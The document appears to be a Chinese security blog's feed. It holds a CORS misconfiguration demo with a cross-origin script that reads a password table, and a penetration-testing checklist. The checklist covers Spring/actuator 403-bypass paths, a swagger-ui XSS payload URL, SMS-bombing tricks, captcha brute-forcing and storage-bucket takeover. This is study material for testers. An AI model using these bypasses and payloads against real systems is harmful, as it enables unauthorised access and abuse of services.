Sharing）是一种<strong>跨域资源共享机制</strong>，它允许Web应用程序从不同的域名访问资源，而不受同源策略的限制。CORS机制需要在服务端进行配置，并且需要在每个跨域请求中添加特定的HTTP头部信息，例如“Access-Control-Allow-Origin”和“Access-Control-Allow-Methods”等。CORS机制可以支持各种类型的HTTP请求，包括GET、POST、PUT、DELETE等，因此它在Web应用程序中的应用非常广泛。</p></blockquote><p><strong>客户端–CORS简单请求</strong></p><p>符合以下条件的为简单请求</p><ul><li><p>请求方法为get，post，head中的一种</p></li><li><p>header头为以下字段的子集</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Accept</span><br><span class="line">Accept-language</span><br><span class="line">Content-language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type:application/x-www-form-urlencoded,multipart/form-data,text/plain</span><br></pre></td></tr></table></figure></li></ul><p><strong>客户端–CORS非简单请求（不符合简单请求的条件时）</strong></p><p>客户端非简单请求流程</p><ul><li>第一次请求为预检请求（OPTIONS方法，Origin请求头）</li><li>根据服务器返回的response来判断是否能够发起CORS请求</li></ul><p><strong>服务端配置</strong></p><p><strong>相关的头部字段含义</strong></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span> 必需项，告诉浏览器允许该源访问资源。</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>必需项，指明了实际请求中允许携带的标头字段。</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>可选项，指定了访问资源时允许使用的请求方法</span><br><span class="line">Access-Control-Allow-Credentials:表示是否允许发送cookie，默认不允许。设置为true时，可以发送cookie</span><br></pre></td></tr></table></figure><p>Nginx配置Demo</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> = /corstest.php &#123;</span><br><span class="line">            <span class="attribute">root</span>   /var/www/html;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">&#x27;GET, POST, OPTIONS&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> Access-Control-Allow-Headers <span class="string">&#x27;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&#x27;</span>;</span><br><span class="line">            <span class="attribute">if</span> (<span class="variable">$request_method</span> = <span class="string">&#x27;OPTIONS&#x27;</span>) &#123;</span><br><span class="line">                     <span class="attribute">return</span> <span class="number">204</span>;</span><br><span class="line">            &#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码配置Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin: *&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Methods:GET, POST, OPTIONS&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Headers:DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>服务端对于跨域请求的处理流程</strong></p><p><img src="/../images/image-20231005214817023.png" alt="image-20231005214817023"></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>错误的<code>Access-Control-Allow-Origin</code>配置</p><p><a href="http://debug.io:90/cors_read.html">http://debug.io:90/cors_read.html</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1/cors.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// If specified, responseType must be empty string or &quot;text&quot;</span></span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">responseType</span> = <span class="string">&#x27;text&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === xhr.<span class="property">DONE</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">write</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/cors.php">http://127.0.0.1/cors.php</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header(&quot;Access-Control-Allow-Origin: *&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;th&gt;name&lt;/th&gt;</span><br><span class="line">    &lt;th&gt;password&lt;/th&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;Jack&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;<span class="number">1</span>ui23p=<span class="number">13</span>!&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>没有设置<code>Access-Control-Allow-Origin</code></p><p><img src="/../images/image-20231005220636163.png" alt="image-20231005220636163"></p><p>设置<code>Access-Control-Allow-Origin</code>为<code>*</code>时</p><p><img src="/../images/image-20231005220734546.png" alt="image-20231005220734546"></p><p>设置<code>Access-Control-Allow-Origin</code>为<code>test.com</code>时</p><p><img src="/../images/image-20231005220817216.png" alt="image-20231005220817216"></p><h1 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h1><ul><li>JSONP是浏览器默认支持的跨域方式（跨域加载javascript），CORS是W3C提供的一个跨域标准</li><li>JSONP只支持GET方法，CORS可以自定义支持的方法</li><li>JSONP几乎支持所有的浏览器，CORS不支持IE10下的浏览器</li><li>JSONP传递的数据要符合JavaScript代码规范，CORS可以是html，xml等多种格式</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>《Web漏洞解析与攻防实战》</p><p><a href="http://drops.xmd5.com/static/drops/papers-6630.html">JSONP挖掘与高级利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pentest Note</title>
      <link href="/2023/08/03/%E5%B8%B8%E8%A7%81%E7%82%B9%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E7%BB%93/"/>
      <url>/2023/08/03/%E5%B8%B8%E8%A7%81%E7%82%B9%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h1><blockquote><p>TIP：后台处有多个接口系统，当访问不同的接口系统时发现网站的图标发生了变化。</p></blockquote><p><strong>进入后台前</strong></p><ul><li><p>是否为真实IP</p></li><li><p>指纹识别打Nday</p></li><li><p>未授权访问和权限绕过</p></li><li><p>敏感信息收集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">API相关：sourcemap，WebPack</span><br><span class="line">JS：HAE，SuperSearchPlus，Urlfinder，手动构造</span><br><span class="line">文件/目录扫描：备份，后台，多级目录下递归扫描</span><br></pre></td></tr></table></figure></li><li><p>API接口测试</p></li><li><p>弱口令</p></li><li><p>sql注入</p></li><li><p>逻辑漏洞</p><ul><li>验证码问题</li><li>登录，注册，修改密码问题</li></ul></li><li><p>其他相同站点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹提取，找到相同站点，理想情况弱口令进入后台，找未授权访问和拿源码审计</span><br></pre></td></tr></table></figure></li><li><p>旁站</p></li></ul><p><strong>进入后台后</strong></p><ul><li><p>登录用户权限是否为后台管理员</p></li><li><p>越权，未授权</p></li><li><p>sql注入</p></li><li><p>文件上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">头像上传，模板文件修改，插件下载，文件管理器。。。。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以找一下哪里可以修改上传文件的配置，然后允许脚本文件上传</span><br><span class="line">看到一个有意思的文章，就是允许上传的文件后缀保存在数据库中的表中，表名类似于allow*，config*，setting*等，可以通过sql注入找到对应的表添加脚本后缀，然后就可以上传脚本文件了</span><br></pre></td></tr></table></figure></li><li><p>存储XSS</p></li><li><p>敏感信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">各种配置信息</span><br></pre></td></tr></table></figure></li></ul><h1 id="403，404"><a href="#403，404" class="headerlink" title="403，404"></a>403，404</h1><p><strong>逐级目录fuzz</strong></p><p>TIP：目录可能为域名的一部分，公司的缩写，api，xxx-api等</p><p><strong>403bypass</strong></p><ul><li><p>Spring，Shiro权限绕过</p><p><a href="https://github.com/0x727/BypassPro">0x727&#x2F;BypassPro: 对权限绕过自动化bypass的burpsuite插件 (github.com)</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">403 /actuator/heapdump</span><br><span class="line">200 /actuator/heapdump;.js</span><br><span class="line"></span><br><span class="line">403 /actuator/httptrace</span><br><span class="line">200 /actuator/httptrace/# (burp抓包改)</span><br></pre></td></tr></table></figure><p>还有其他特殊情况</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">404 /sys/actuator </span><br><span class="line">200 /sys/..;/actuator </span><br><span class="line">200 /sys/;/actuator</span><br></pre></td></tr></table></figure><p>很多时候访问actuator，不会显示端点，但是访问具体的端点是可以访问到的，这个时候可以访问mappings端点来查看存在哪些端点</p></li><li><p>burpfakeIP</p><p><img src="/../images/image-20230911095606358.png?lastModify=1695029992" alt="image-20230911095606358"></p><p>  <img src="/../images/image-20230911095617521.png?lastModify=1695029992" alt="image-20230911095617521"></p></li></ul><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><ul><li><p>能枚举用户名就先枚举</p></li><li><p>可以看一下密码的复杂度要求来生成对应字典</p></li><li><p>图片验证码绕过</p><ul><li><p>验证码是否失效</p></li><li><p>burp插件识别</p></li></ul></li><li><p>数据包加密</p><ul><li><p>破解</p><p><a href="https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">快速定位前端加密方法 | 回忆飘如雪</a></p><p><a href="https://blog.wanghw.cn/security/burpcrypto-single-parameter-cryptoblast.html">BurpCrypto: 对单加密参数的登录接口进行密码爆破的一种方法 – Whwlsfb’s Tech Blog</a></p></li><li><p>输入一些常见的弱口令，收集加密后的值，然后固定密码，爆破用户名</p></li><li><p>使用selenium模块模拟手动提交绕过</p></li></ul></li><li><p>同一个公司的站点的账号和密码用于撞库</p></li><li><p>社工字典生成</p><p>需要先收集一下邮箱，公司名，工号，网站文章的作者名等信息</p></li><li><p>针对不同行业，存在的用户很多都是不一样的，可以去了解一些行业黑话</p></li><li><p>如果存在邀请码，可以尝试一些特殊的数字组合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">666</span><br><span class="line">666666</span><br><span class="line">888</span><br><span class="line">888888</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></li></ul><h1 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h1><blockquote><p>TIP：很多API接口文档都藏在二级，三级，四级甚至五级目录下（druid什么的也是），推荐使用burp被动扫描，扫描出来后可以使用工具或者手工进行接口测试</p><p>APIkit：不能使用原始请求头，只保留了Cookie，被动扫描不能关闭</p><p>Routevulscan：不能控制扫描层数，bypass有点问题</p><p>onescan：高度自定义，缺少bypass</p><p>我这里选择onescan+自定义bypass字典，然后可以用APIkit来测试接口</p></blockquote><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p><strong>收集接口</strong></p><ul><li><p>找一找泄漏的接口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">泄漏的api文档，比如swagger接口文档</span><br><span class="line">目标公司的开发者平台</span><br><span class="line">SourceMap</span><br></pre></td></tr></table></figure></li><li><p>supersearchplus</p></li><li><p>urlfinder</p></li><li><p>HAE被动收集（进行一些操作，比如登录什么的）</p></li></ul><p><strong>收集完后，确定好BaseDir</strong></p><p><strong>测试工具</strong></p><ul><li>ReadyAPI</li><li>packerfuzzer</li><li>swagger-exp</li><li>supersearchplus</li><li>联动xray</li></ul><p><strong>常见测试点</strong></p><ul><li><p>特定的接口：比如文件上传接口</p></li><li><p>越权</p></li><li><p>sql注入</p></li><li><p>未授权访问</p></li><li><p>鉴权的数据，如JWT</p></li><li><p>后端组件漏洞：如fastjson，log4j</p></li><li><p>响应数据包信息泄漏：敏感信息，组件版本号，参数泄漏</p></li><li><p>FUZZ</p><ul><li>通过已知的接口，猜测未知接口，如看到imageUpload可以试试fileUpload</li><li>爆破接口参数</li><li>目录扫描</li></ul></li></ul><h2 id="Swagger接口TIPS"><a href="#Swagger接口TIPS" class="headerlink" title="Swagger接口TIPS"></a>Swagger接口TIPS</h2><ul><li><p>swagger-ui界面的xss</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json</span><br><span class="line">swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json</span><br></pre></td></tr></table></figure></li><li><p>接口文档可能不止一个–<code>swagger-resources</code></p><p><img src="/../images/image-20230905205724346.png?lastModify=1695029992" alt="image-20230905205724346"></p></li><li><p>只有接口文档，没有swagger-ui</p><p>将接口文档导入浏览器插件swagger-ui</p></li><li><p>接口文档内容问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host为内网ip</span><br><span class="line">basePath错误</span><br><span class="line">schemes错误，如网站使用https，接口文档使用http</span><br><span class="line">接口文档没有鉴权的header头</span><br></pre></td></tr></table></figure><p>swagger接口文档示例</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;swagger&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;接口文档标题&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;api.example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;basePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;schemes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;http&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;securityDefinitions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">       <span class="attr">&quot;bearerAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;apiKey&quot;</span><span class="punctuation">,</span> </span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Authorization&quot;</span><span class="punctuation">,</span> # name要看实际的鉴权头</span><br><span class="line">           <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;header&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;bearerAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>xxx<span class="punctuation">]</span>  # xxx为鉴权数据</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;/users&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;获取用户列表&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;用于获取所有用户的列表信息&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;成功响应&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;definitions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>修改完成后，使用swagger-exp测试即可</p></li></ul><h2 id="ReadApi使用"><a href="#ReadApi使用" class="headerlink" title="ReadApi使用"></a>ReadApi使用</h2><p><img src="/../images/image-20230829114309049.png?lastModify=1695029992" alt="image-20230829114309049"></p><p>扫描完成后，会生成PDF报告</p><p><img src="/../images/image-20230829114529740.png?lastModify=1695029992" alt="image-20230829114529740"></p><p><img src="/../images/image-20230829114701973.png?lastModify=1695029992" alt="image-20230829114701973"></p><h1 id="存储桶"><a href="#存储桶" class="headerlink" title="存储桶"></a>存储桶</h1><p><img src="/../images/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d61676525453525423925424225453725383125414625453725383925383732392e7.png" alt="68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d61676525453525423925424225453725383125414625453725383925383732392e7"></p><blockquote><p>感觉碰到比较多的是遍历，put上传和AKSK泄漏</p></blockquote><ul><li><p>Bucket 爆破：InvalidBucketName</p></li><li><p>Bucket 接管：NoSuchBucket</p><p>类似于子域名接管，只是cname指向的是Bucket</p><p><img src="/../images/f8c5eeb73755688f1aaa2701080ea3a6.png?lastModify=1695029992" alt="WeiyiGeek."></p><blockquote><p>因为域名（源域名）配置了CNAME，但是CNAME指向的域名并没有被注册。那么攻击者可以注册这个CNAME指向的域名，就可以控制了源域名。</p><p>因为域名配置了CNAME，但是CNAME指向的Bucket没有被注册（被删除了），那么攻击者可以注册这个CNAME指向的Bucket，从而接管该域名。</p><p>参考文章：<a href="https://kebingzao.com/2021/06/21/s3-subdomain-takeover/">记一次因为 S3 bucket 删除而导致的子域名接管(subdomain takeover)的安全问题 | Zach Ke’s Notes (kebingzao.com)</a></p></blockquote></li><li><p>Bucke遍历</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ossx-main爬取链接</span><br><span class="line">wget批量下载</span><br></pre></td></tr></table></figure></li><li><p>PUT上传文件</p></li><li><p>策略可访问&#x2F;修改（&#x2F;?acl）</p></li></ul><p>可以关注一下静态文件是不是<strong>从其他域名引入的</strong>，一般从其他域名引入的就是从存储桶引入的。</p><p>还有一种情况是藏在多级目录下，比如<code>/minio/picture/</code></p><h1 id="逻辑漏洞–业务安全"><a href="#逻辑漏洞–业务安全" class="headerlink" title="逻辑漏洞–业务安全"></a>逻辑漏洞–业务安全</h1><blockquote><p>业务大于安全，安全只是锦上添花罢了。。</p></blockquote><h2 id="业务梳理–待做"><a href="#业务梳理–待做" class="headerlink" title="业务梳理–待做"></a><strong>业务梳理</strong>–待做</h2><p>可以先将业务主体划分为几个大模块，再将每个大模块逐个细分为子模 块。</p><p>可以从账号体系开始，如用户的注册、登录、密码找回、信息存储等。</p><p>再到具体的业 务办理，如商品的搜索、选择、支付、生成订单，以及订单查询和用户评论等。</p><p><img src="/../images/image-20230713141756097.png?lastModify=1695029992" alt="image-20230713141756097"></p><p>​再根据业务场景梳理出流程图</p><p><img src="/../images/image-20230713141918648.png?lastModify=1695029992" alt="image-20230713141918648"></p><p><img src="/../images/image-20230713134331110.png?lastModify=1695029992" alt="image-20230713134331110"></p><p><strong>测试方法</strong></p><p><img src="/../images/image-20230713134200584.png?lastModify=1695029992" alt="image-20230713134200584"></p><h2 id="关于访问控制"><a href="#关于访问控制" class="headerlink" title="关于访问控制"></a>关于访问控制</h2><p>用户访问接口→用户是否合法（认证）→用户是否拥有权限（授权：权限控制和角色控制）→ 接口返回数据</p><ul><li><p>认证</p><p>认证就是判断你这个用户是不是合法用户，他是一个过程，可以理解为是一个认证的过程。</p></li><li><p>授权</p><p>授权其实就是你认证成功之后，你的权限能访问系统的那些资源，当我们身份认证通过后需要分配权限决定你可以访问那些资源。</p></li><li><p>权限控制</p><p>权限控制是一种基于用户具有特定权限来限制其对系统资源访问的机制。</p><p>每个用户被分配了一组权限，这些权限定义了他们可以执行的操作。</p><p>例如，一个用户可能被授予读取、写入或删除文件的权限。当用户尝试访问某个资源时，系统会检查其是否具有足够的权限来执行该操作。如果用户没有所需的权限，则访问将被拒绝。</p></li><li><p>角色控制</p><p>角色控制是一种基于用户具有特定角色来限制其对系统资源访问的机制。</p><p>每个角色包含了一组权限，而用户则被分配到不同的角色中。通过将用户与角色相关联，可以灵活地管理用户的权限。</p><p>例如，一个管理员角色可能具有更高级别的权限，而普通用户角色则只能执行基本操作。当用户尝试访问某个资源时，系统会检查其所属的角色是否具有足够的权限来执行该操作。如果用户所属角色不具备所需的权限，则访问将被拒绝。</p></li></ul><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><h3 id="短信验证码"><a href="#短信验证码" class="headerlink" title="短信验证码"></a>短信验证码</h3><ul><li><p>短信轰炸</p><p>绕过方法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+86</span><br><span class="line">前后空格</span><br><span class="line">多手机号参数</span><br><span class="line">添加逗号</span><br><span class="line"><span class="built_in">type</span>参数</span><br><span class="line">手机号长度</span><br><span class="line">Fuzz（位置手机号前，后，前后）</span><br></pre></td></tr></table></figure></li><li><p>暴力破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通常短信验证码有效期为1min，只能爆4位的</span><br></pre></td></tr></table></figure></li><li><p>暴力生成破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以进行短信轰炸，但不允许暴力破解（设置了验证次数）</span><br><span class="line">达到验证次数后就重新生成短信验证码，然后再次破解</span><br></pre></td></tr></table></figure></li><li><p>内容篡改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trubo Intruder的%s回显</span><br><span class="line">验证码由客户端发送</span><br></pre></td></tr></table></figure></li><li><p>短信分发</p><blockquote><p>一次发送给多个手机号并且收到的验证码是相同的</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;phone&quot;</span><span class="punctuation">:</span><span class="string">&quot;phone1,phone2&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>失效</p><ul><li><p>后端实际不校验</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证码置空，删除，任意值</span><br></pre></td></tr></table></figure></li><li><p>服务端回显</p></li><li><p>验证码复用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证码的有效期过长，并且在使用后仍可以再次使用</span><br><span class="line">或者</span><br><span class="line">在一定时间内发送的短信都是相同的</span><br></pre></td></tr></table></figure></li></ul></li><li><p>绑定关系失效</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证码未与手机号进行绑定</span><br><span class="line">最终提交时存在两个手机号参数：一个用于验证短信验证码，一个用于注册/登录，后端没有对这两个参数做一致性校验</span><br></pre></td></tr></table></figure></li><li><p>短信验证码存在默认值</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所有手机号均存在默认短信验证码（没碰到过）</span><br><span class="line">或者只有测试手机号存在默认短信验证码（碰到过）</span><br></pre></td></tr></table></figure></li></ul><h3 id="图形验证码"><a href="#图形验证码" class="headerlink" title="图形验证码"></a>图形验证码</h3><p><a href="https://mp.weixin.qq.com/s/a03-z_dk21DhbG025aqAeg">盘点图形验证码的漏洞挖掘方式，看完之后你还不会挖吗？</a></p><ul><li><p>图形验证码识别</p><p><a href="https://github.com/f0ng/captcha-killer-modified/blob/main/FAQ.md">captcha-killer-modified&#x2F;FAQ.md at main · f0ng&#x2F;captcha-killer-modified</a></p><p><a href="https://www.cnblogs.com/4geek/p/17145385.html#!comments">【Security】利用Burp Suite爆破带有验证码Web登录接口（保姆级教程） - 为极客而生 - 博客园</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">regex：<span class="string">&quot;token&quot;</span>:<span class="string">&quot;(.*?)&quot;</span></span><br><span class="line">[*]  use @captcha@ replace captcha</span><br><span class="line">[*]  use @captcha-killer-modified@ replace captcha<span class="string">&#x27;s token</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230918104832773.png?lastModify=1695029992" alt="image-20230918104832773"></p></li><li><p>图形验证码复用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图形验证码有效时间过长（碰到过一个验证码信息存储在JWT的</span><br><span class="line">里的，通过修改EXP从而验证码复用）</span><br><span class="line"></span><br><span class="line">没有重置图形验证码</span><br><span class="line"></span><br><span class="line">后端实际不校验验证码</span><br></pre></td></tr></table></figure></li><li><p>图形验证码Dos攻击</p><p>通过控制图形验证码的大小</p></li></ul><h2 id="并发–条件竞争"><a href="#并发–条件竞争" class="headerlink" title="并发–条件竞争"></a>并发–条件竞争</h2><p>万物皆可并发</p><p><img src="/../images/image-20230826174437969.png?lastModify=1695029992" alt="image-20230826174437969"></p><p><strong>修复方案</strong></p><p>数据库的事务锁</p><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" 